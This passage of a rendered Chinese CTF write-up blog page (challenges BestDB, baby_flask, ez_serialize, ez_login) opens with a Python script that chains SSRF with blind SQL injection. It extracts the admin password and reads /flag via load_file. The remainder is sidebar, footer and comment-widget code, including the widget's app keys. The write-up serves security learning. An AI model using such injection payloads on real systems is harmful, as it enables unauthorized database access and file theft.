%26password=admin&quot;</span></span><br><span class="line">        <span class="comment"># url = &quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or ascii(substr((select password from users where username=&#x27;admin&#x27;),%d,1))=%d-- %26password=&quot;%(len(flag)+1,i)</span></span><br><span class="line">        <span class="comment"># url = &quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or ascii(substr(hex((select password from users where username=&#x27;admin&#x27;)),&#123;&#125;,1))=&#123;&#125;-- %26password=&quot;.format(len(flag)+1,j)</span></span><br><span class="line">        <span class="comment"># url = &quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or ascii(substr((database()),&#123;&#125;,1))=&#123;&#125;-- %26password=&quot;.format(len(flag)+1,j)</span></span><br><span class="line">        url = <span class="string">&quot;http://183.129.189.60:10015/?url=http://localhost/se1f_Log3n.php?username=&#x27; or ascii(substr((load_file(&#x27;/flag&#x27;)),&#123;&#125;,1))=&#123;&#125;-- %26password=&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>,j)</span><br><span class="line">        session = requests.session()</span><br><span class="line">        response = session.post(url,data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;,files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/Administrator/Desktop/1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)   //这里的文件名是本地随意创建的</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;correct?&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BestDB"><span class="nav-number">1.</span> <span class="nav-text">BestDB</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#baby-flask"><span class="nav-number">2.</span> <span class="nav-text">baby_flask</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-serialize"><span class="nav-number">3.</span> <span class="nav-text">ez_serialize</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-login"><span class="nav-number">4.</span> <span class="nav-text">ez_login</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安小琪"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">安小琪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+
+
+<!--
+ <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+-->
+
+
+  <span class="author" itemprop="copyrightHolder">安小琪</span>
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
+  </div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
+      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
+      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
+      avatar     : '',
+      meta       : guest,
+      pageSize   : '6' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
